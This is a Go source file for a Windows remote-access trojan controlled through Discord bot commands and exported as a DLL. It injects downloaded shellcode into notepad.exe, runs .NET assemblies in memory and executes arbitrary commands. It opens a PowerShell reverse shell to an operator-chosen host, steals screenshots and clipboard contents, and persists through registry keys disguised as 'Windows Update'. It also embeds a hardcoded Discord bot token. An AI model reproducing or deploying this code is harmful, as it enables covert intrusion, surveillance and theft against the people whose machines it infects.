package main

import "C"

import (
	"io"
	"os"
	"net"
	"fmt"
	"time"
	"image"
	"runtime"
	"strings"
	"strconv"
	"syscall"
	"unsafe"
	"net/http"
	"io/ioutil"
	"os/exec"
	"os/signal"
	"image/png"
	"encoding/json"
	"path/filepath"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"

	"github.com/bwmarrin/discordgo"
	"github.com/vova616/screenshot"
	"github.com/mitchellh/go-ps"
	"github.com/atotto/clipboard"
	"github.com/google/uuid"
	"github.com/redcode-labs/Coldfire"
	
	clr "github.com/ropnop/go-clr"
)

type shellcode struct {
	Shellcode []byte `json:"Shellcode"`
}


var DISCORD_TOKEN string = "OTEyODM5NDk1NzUyMjUzNDUw.YZ1yBw.RpcC1kxZ183ZwvnmXZ34Xs8UU54"

var RSHELL_HOST string
var RSHELL_PORT int
var CLIENT_ID string
var ACTIVE_STATUS bool = false


func setActive(identifier string) {
	if identifier == CLIENT_ID {
		ACTIVE_STATUS = true
	}
	return
}

func setInactive(identifier string) {
	if identifier == CLIENT_ID {
		ACTIVE_STATUS = false
	}
}

func ReadClipboard() string {
	text, _ := clipboard.ReadAll()
	return text
}

func WriteClipboard(text string) {
	clipboard.WriteAll(text)
}

func ExePath() string {
	ex, err := os.Executable()
	if err != nil {
		fmt.Println(err)
	}
	exPath := filepath.Dir(ex)
	return exPath
}

func GetLocalIP() string {
	ip := coldfire.GetLocalIp()
	return ip
}

func GetGlobalIP() string {
	ip := coldfire.GetGlobalIp()
	return ip
}

func checkOK(hr uintptr, caller string) {
	if hr != 0x0 {
		fmt.Println("%s returned 0x%08x", caller, hr)
	}
}

func ExecDotNetAssembly(assemblybytes []byte) {
	runtime.KeepAlive(assemblybytes)

	var pMetaHost uintptr
	hr := clr.CLRCreateInstance(&clr.CLSID_CLRMetaHost, &clr.IID_ICLRMetaHost, &pMetaHost)
	checkOK(hr, "CLRCreateInstance")
	metaHost := clr.NewICLRMetaHostFromPtr(pMetaHost)

	versionString := "v4.0.30319"
	pwzVersion, _ := syscall.UTF16PtrFromString(versionString)
	var pRuntimeInfo uintptr
	hr = metaHost.GetRuntime(pwzVersion, &clr.IID_ICLRRuntimeInfo, &pRuntimeInfo)
	checkOK(hr, "metahost.GetRuntime")
	runtimeInfo := clr.NewICLRRuntimeInfoFromPtr(pRuntimeInfo)

	var isLoadable bool
	hr = runtimeInfo.IsLoadable(&isLoadable)
	checkOK(hr, "runtimeInfo.IsLoadable")
	if !isLoadable {
		fmt.Println("[!] IsLoadable returned false. Bailing...")
	}

	hr = runtimeInfo.BindAsLegacyV2Runtime()
	checkOK(hr, "runtimeInfo.BindAsLegacyV2Runtime")

	var pRuntimeHost uintptr
	hr = runtimeInfo.GetInterface(&clr.CLSID_CorRuntimeHost, &clr.IID_ICorRuntimeHost, &pRuntimeHost)
	runtimeHost := clr.NewICORRuntimeHostFromPtr(pRuntimeHost)
	hr = runtimeHost.Start()
	checkOK(hr, "runtimeHost.Start")
	fmt.Println("[+] Loaded CLR into this process")

	var pAppDomain uintptr
	var pIUnknown uintptr
	hr = runtimeHost.GetDefaultDomain(&pIUnknown)
	checkOK(hr, "runtimeHost.GetDefaultDomain")
	iu := clr.NewIUnknownFromPtr(pIUnknown)
	hr = iu.QueryInterface(&clr.IID_AppDomain, &pAppDomain)
	checkOK(hr, "iu.QueryInterface")
	appDomain := clr.NewAppDomainFromPtr(pAppDomain)
	fmt.Println("[+] Got default AppDomain")

	safeArray, err := clr.CreateSafeArray(assemblybytes)
	fmt.Println(err)
	runtime.KeepAlive(safeArray)
	fmt.Println("[+] Crated SafeArray from byte array")

	var pAssembly uintptr
	hr = appDomain.Load_3(uintptr(unsafe.Pointer(&safeArray)), &pAssembly)
	checkOK(hr, "appDomain.Load_3")
	assembly := clr.NewAssemblyFromPtr(pAssembly)
	fmt.Printf("[+] Executable loaded into memory at 0x%08x\n", pAssembly)

	var pEntryPointInfo uintptr
	hr = assembly.GetEntryPoint(&pEntryPointInfo)
	checkOK(hr, "assembly.GetEntryPoint")
	fmt.Printf("[+] Executable entrypoint found at 0x%08x. Calling...\n", pEntryPointInfo)
	fmt.Println("-------")
	methodInfo := clr.NewMethodInfoFromPtr(pEntryPointInfo)

	var pRetCode uintptr
	nullVariant := clr.Variant{
		VT:  1,
		Val: uintptr(0),
	}
	
	hr = methodInfo.Invoke_3(
		nullVariant,
		uintptr(0),
		&pRetCode)

	fmt.Println("-------")

	checkOK(hr, "methodInfo.Invoke_3")
	fmt.Printf("[+] Executable returned code %d\n", pRetCode)

	appDomain.Release()
	runtimeHost.Release()
	runtimeInfo.Release()
	metaHost.Release()

}

func CurrentUserPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Windows Update", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func LocalMachinePersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Windows Update", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func ImageFileExecutionOptionsPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Debugger", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func WinlogonHelperPersist() {
	exe_path := ExePath()
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.SET_VALUE)
	if err != nil {
		fmt.Println(err)
	}
	err = k.SetStringValue("Userinit", exe_path)
	if err != nil {
		fmt.Println(err)
	}
}

func getShellcode(url string) []byte {

	shellcodeClient := http.Client{
		Timeout: time.Second * 2,
	}

	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0")

	res, getErr := shellcodeClient.Do(req)
	if getErr != nil {
		fmt.Println("Error while retrieving shellcode")
		fmt.Println(err)
	}

	if res.Body != nil {
		defer res.Body.Close()
	}

	body, readErr := ioutil.ReadAll(res.Body)
	if readErr != nil {
		fmt.Println("Error while reading bytes")
		fmt.Println(err)
	}
	
	sc1 := shellcode{}
	jsonErr := json.Unmarshal(body, &sc1)
	if jsonErr != nil {
		fmt.Println("Error while unmarshalling the json")
		fmt.Println(err)
	}

	shellcodeBytes := sc1.Shellcode
	return shellcodeBytes
}

func downloadFile(filepath string, url string) (err error) {
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Check the server response
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Bad status: %s", resp.Status)
	}

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}
	return nil
}

func ExecuteCommand(command string) string{
	output, err := coldfire.CmdOut(command)
	if err != nil {
		return err.Error()
	}
	return output
}

func takeSnapshot() string {
	
	img, _ := screenshot.CaptureScreen()
	myImg := image.Image(img)
	img_name := getID() + ".png"
	file, _ := os.Create(img_name)
	defer file.Close()
	png.Encode(file, myImg)
	return img_name
}

func removeFile(fileName string) {
	time.Sleep(15 * time.Second)
	err := os.Remove(fileName)
	if err != nil {
		fmt.Println("Unable to remove the file: " + fileName)
		fmt.Println(err)
		return
	}
}

func process_injection(sc []byte, process_name string) {
	pid := find_process(process_name)
	if pid == 0 {
		fmt.Println("Cannot find " + process_name + " process")
		return
	}

	kernel32 := windows.NewLazyDLL("kernel32.dll")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	proc, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		fmt.Println(fmt.Sprintf("[!] OpenProcess(): %s", err.Error()))
		return
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(proc), 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAlloc != nil  && errVirtualAlloc.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] VirtualAllocEx(): %s", errVirtualAlloc.Error()))
		return
	}

	_,_, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc), addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] WriteProcessMemory(): %s", errWriteProcessMemory.Error()))
		return
	}
	
	op := 0
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&op)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] VirtualProtectEx(): %s", errVirtualProtectEx.Error()))
		return
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		fmt.Println(fmt.Sprintf("[!] CreateRemoteThreadEx(): %s", errCreateRemoteThreadEx.Error()))
		return
	}

	errCloseHandle := windows.CloseHandle(proc)
	if errCloseHandle != nil {
		fmt.Println(fmt.Sprintf("[!] CloseHandle(): %s", errCloseHandle.Error()))
		return
	}
}

func find_process(proc string) int {
	processList, err := ps.Processes()
	if err != nil {
		return -1
	}

	for x := range processList {
		var process ps.Process
		process = processList[x]
		if process.Executable() != proc {
			continue
		}
		p, errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION, false, uint32(process.Pid()))
		if errOpenProcess != nil {
			continue
		}
		windows.CloseHandle(p)
		return process.Pid()
	}
	return 0
}

func sendShell(remoteHost string) {
	conn, err := net.Dial("tcp", remoteHost)
	if err != nil {
		return
	}
	var cmd *exec.Cmd
	cmd = exec.Command("powershell")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func getID() string {
	id, err := uuid.NewRandom()
	if err != nil {
		fmt.Println("Could not generate unique ID using default")
		return "Juelz"
	}
	return id.String()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "!salute" {
		s.ChannelMessageSend(m.ChannelID, "Salute! from " + CLIENT_ID)
	}

	if strings.HasPrefix(m.Content, "!set-active ") {
		id := m.Content[12:]
		setActive(id)
		if ACTIVE_STATUS == true {
			s.ChannelMessageSend(m.ChannelID, "Agent: " + id + " has been set to active status.")
		}
	}

	if strings.HasPrefix(m.Content, "!set-inactive ") {
		id := m.Content[14:]
		setInactive(id)
		if ACTIVE_STATUS == false {
			s.ChannelMessageSend(m.ChannelID, "Agent: " + id + " has been set to inactive status.")
		}
	}

	if ACTIVE_STATUS == true {
		if m.Content == "!snapshot" {
			snapshotName := takeSnapshot()
			snapshotData, err := os.OpenFile(snapshotName, os.O_RDWR, 0644)
			if err != nil {
				fmt.Println("Unable to open the specified file ", err)
			} 
			s.ChannelFileSend(m.ChannelID, snapshotName, snapshotData)
			defer snapshotData.Close()
			go removeFile(snapshotName)
		}
	
		if strings.HasPrefix(m.Content, "!exec-shellcode ") {
			u := m.Content[16:]
			s.ChannelMessageSend(m.ChannelID, "Attempting to execute shellcode located at " + u)
			se := getShellcode(u)
			go process_injection(se, "notepad.exe")
	
		}

		if strings.HasPrefix(m.Content, "!exec-assembly ") {
			u := m.Content[15:]
			s.ChannelMessageSend(m.ChannelID, "Attempting to execute assembly located at " + u)
			asm := getShellcode(u)
			go ExecDotNetAssembly(asm)
	
		}
	
		if strings.HasPrefix(m.Content, "!exec-command ") {
			comm := m.Content[14:]
			s.ChannelMessageSend(m.ChannelID, "Attempting to run your command")
			output := ExecuteCommand(comm)
			s.ChannelMessageSend(m.ChannelID, output)
		}


	
		if strings.HasPrefix(m.Content, "!download ") {
			// For now assuming this is an exe will add filename helper functions for filename later
			fileUrl := m.Content[10:]
			username := os.Getenv("USERNAME")
			filename := "user32.exe"
			downloadPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\%s", username, filename)
			err := downloadFile(downloadPath, fileUrl)
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, "I was unable to successfully download the file")
			}
			s.ChannelMessageSend(m.ChannelID, "Successfully downloaded the file!")
		}
	
		if m.Content == "!persist-user" {
			s.ChannelMessageSend(m.ChannelID, "Attempting to persist to registry Current User run")
			go CurrentUserPersist()
		}

		if m.Content == "!get-local-ip" {
			ip := GetLocalIP()
			s.ChannelMessageSend(m.ChannelID, ip)
		}

		if m.Content == "!get-global-ip" {
			ip := GetGlobalIP()
			s.ChannelMessageSend(m.ChannelID, ip)
		}

		if m.Content == "!get-clipboard" {
			text := ReadClipboard()
			s.ChannelMessageSend(m.ChannelID, text)
		}

		if strings.HasPrefix(m.Content, "!set-clipboard ") {
			text := m.Content[15:]
			s.ChannelMessageSend(m.ChannelID, "Setting contents of clipboard to: " + text)
			go WriteClipboard(text)
		}

		if m.Content == "!reverse-shell" {
			if RSHELL_HOST == "" {
				s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote host")
				return
			}
			if RSHELL_PORT == 0 {
				s.ChannelMessageSend(m.ChannelID, "I cannot send the reverse shell because you have not set the remote port")
				return
			}
			rhost := RSHELL_HOST + ":" + strconv.Itoa(RSHELL_PORT)
			s.ChannelMessageSend(m.ChannelID, "Attempting to open reverse shell to " + rhost)
			go sendShell(rhost)
	
		}
	
		if strings.HasPrefix(m.Content, "!set-rshell-host ") {
			RSHELL_HOST = m.Content[17:]
			s.ChannelMessageSend(m.ChannelID, "Reverse shell host has been updated")
		}
	
		if strings.HasPrefix(m.Content, "!set-rshell-port ") {
			pr, i_err := strconv.Atoi(m.Content[17:])
			if i_err != nil {
				s.ChannelMessageSend(m.ChannelID, "I was unable to set the port please try again")
				return
			}
			RSHELL_PORT = pr
			s.ChannelMessageSend(m.ChannelID, "Reverse shell port has been updated")
		}
	
		if m.Content == "!get-rshell-host" {
			s.ChannelMessageSend(m.ChannelID, RSHELL_HOST)
		}
	
		if m.Content == "!get-rshell-port" {
			s.ChannelMessageSend(m.ChannelID, strconv.Itoa(RSHELL_PORT))
		}
	
		if strings.HasPrefix(m.Content, "!echo ") {
			msg := m.Content[5:]
			s.ChannelMessageSend(m.ChannelID, msg)
		}


	
	}
}
	

func main() {
	CLIENT_ID = getID()
	dg, err := discordgo.New("Bot " + DISCORD_TOKEN)
	if err != nil {
		fmt.Println("Error creating Discord session,", err)
		return
	}
	
	dg.AddHandler(messageCreate)

	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection,", err)
		return
	}

	//fmt.Println("Bot is now running. Press Ctrl-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}

//export DllMain
func DllMain() {
	main()
}